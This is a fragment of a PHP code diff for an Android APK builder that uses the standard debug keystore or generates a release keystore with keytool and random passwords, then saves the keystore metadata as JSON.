+            return [
+                'mode' => 'debug',
+                'path' => $debugKeystore,
+                'keystore_pass' => 'android',
+                'key_alias' => 'androiddebugkey',
+                'key_pass' => 'android',
+            ];
+        }
+
+        // 3. release 模式：使用自动生成的 release keystore
+        $releaseKeystore = $this->toolsDir . '/' . ApkBuilderConstants::RELEASE_KEYSTORE_FILENAME;
+        $metaPath = $this->toolsDir . '/' . ApkBuilderConstants::KEYSTORE_META_FILENAME;
+
+        if ($this->fileSystem->exists($releaseKeystore) && $this->fileSystem->exists($metaPath)) {
+            $meta = json_decode($this->fileSystem->get($metaPath), true);
+            if (is_array($meta) && ! empty($meta['key_alias']) && ! empty($meta['keystore_pass'])) {
+                return [
+                    'mode' => 'release-auto',
+                    'path' => $releaseKeystore,
+                    'keystore_pass' => $meta['keystore_pass'],
+                    'key_alias' => $meta['key_alias'],
+                    'key_pass' => $meta['key_pass'] ?? $meta['keystore_pass'],
+                ];
+            }
+        }
+
+        // 自动生成 release keystore
+        return $this->generateReleaseKeystore($releaseKeystore, $metaPath);
+    }
+
+    /**
+     * 生成 release 级别的 keystore 并持久保存元数据。
+     *
+     * @return array{mode: string, path: string, keystore_pass: string, key_alias: string, key_pass: string}
+     */
+    private function generateReleaseKeystore(string $keystorePath, string $metaPath): array
+    {
+        $autoConfig = config('apk-builder.signing.auto_generate', []);
+        $keyAlg = $autoConfig['key_alg'] ?? 'RSA';
+        $keySize = $autoConfig['key_size'] ?? 2048;
+        $validity = $autoConfig['validity'] ?? 36500;
+        $dname = $autoConfig['dname'] ?? 'CN=App,OU=Mobile,O=Company,L=City,ST=State,C=CN';
+
+        $keyAlias = ApkBuilderConstants::AUTO_KEY_ALIAS_PREFIX . bin2hex(random_bytes(4));
+        $keystorePass = bin2hex(random_bytes(ApkBuilderConstants::AUTO_KEYSTORE_PASS_LENGTH / 2));
+        $keyPass = $keystorePass;
+
+        $this->fileSystem->ensureDirectoryExists(dirname($keystorePath));
+
+        $command = sprintf(
+            'keytool -genkey -v -keystore %s -storepass %s -alias %s -keypass %s -keyalg %s -keysize %d -validity %d -dname %s',
+            escapeshellarg($keystorePath),
+            escapeshellarg($keystorePass),
+            escapeshellarg($keyAlias),
+            escapeshellarg($keyPass),
+            escapeshellarg($keyAlg),
+            $keySize,
+            $validity,
+            escapeshellarg($dname)
+        );
+
+        $result = $this->processRunner->run($command);
+
+        if (! $this->fileSystem->exists($keystorePath)) {
+            throw ApkBuildException::signingFailed(
+                'Failed to generate release keystore: ' . ($result->errorOutput() ?: $result->output())
+            );
+        }
+
+        // 持久保存元数据
+        $meta = [
+            'key_alias' => $keyAlias,
+            'keystore_pass' => $keystorePass,
+            'key_pass' => $keyPass,
+            'key_alg' => $keyAlg,
+            'key_size' => $keySize,
+            'validity' => $validity,
+            'dname' => $dname,
+            'created_at' => date('Y-m-d H:i:s'),
+        ];
+        $this->fileSystem->put($metaPath, json_encode($meta, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
+
+        Log::channel('apk')->info('Generated release keystore', [
+            'path' => $keystorePath,
+            'alias' => $keyAlias,
+            'validity_days' => $validity,
+        ]);
+
+        return [
+            'mode' => 'release-auto',
+            'path' => $keystorePath,
+            'keystore_pass' => $keystorePass,
+            'key_alias' => $keyAlias,
+            'key_pass' => $keyPass,
+        ];
+    }
+
+    /**
+     * 生成 debug keystore（仅在 debug 模式下使用）。
+     */
+    private function generateDebugKeystore(string $path): void
     {
         $command = sprintf(
             'keytool -genkey -v -keystore %s -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Debug,O=Android,C=US"',
